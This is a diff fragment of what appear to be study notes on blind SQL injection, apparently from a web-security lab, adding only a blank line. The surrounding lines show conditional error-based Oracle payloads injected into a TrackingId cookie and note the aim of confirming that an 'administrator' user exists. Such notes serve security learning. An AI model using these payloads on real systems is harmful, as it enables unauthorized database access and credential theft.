@@ -256,6 +256,7 @@ GIVEN : The database contains a different table called users, with columns calle
    -CONFIRM USER (administrator) IS EXIST OR NOT
     
     1.You can also exploit this behavior to test conditions. First, submit the following query:
+    
       TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
       
       TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/1) ELSE '' END FROM dual)||'
